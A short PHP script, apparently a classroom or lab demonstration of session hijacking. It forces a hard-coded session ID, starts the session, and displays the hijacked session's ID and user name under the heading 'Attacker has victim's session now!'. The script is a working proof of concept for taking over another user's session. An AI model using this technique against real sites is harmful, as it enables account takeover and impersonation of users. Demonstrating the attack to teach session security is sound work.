<?php
session_id("uu1mrold31i1phpovt8ig78m7c"); // Change Session id value
session_start();
?>

<h2>Attacker has victim's session now!</h2>
<p>Session ID in use: <?php echo session_id(); ?></p>
<p>User: <?php echo $_SESSION['user'] ?? 'Not set'; ?></p>
